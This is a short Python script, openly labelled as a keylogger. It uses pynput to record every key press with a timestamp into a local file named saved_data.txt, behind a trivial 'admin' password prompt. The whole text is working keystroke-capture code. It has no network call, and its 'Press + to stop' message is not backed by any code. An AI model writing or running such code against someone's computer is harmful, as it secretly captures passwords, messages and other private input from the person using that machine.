from os import write
from sys import exit
from datetime import datetime
from pynput.keyboard import Listener

def write_to_file(data):
    # print(data)
    with open("saved_data.txt","a") as f:
        time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        try: f.write(f'\n{time} - {str(data)}')
        except: f.write(f'\n{time} - undefined sign')

def main():
    if str(input("type password: ")) == "admin":
        print("\* keylogger is running */\nPress + to stop")
        with Listener(on_press=write_to_file) as l: l.join()

if __name__ == "__main__":
    main()
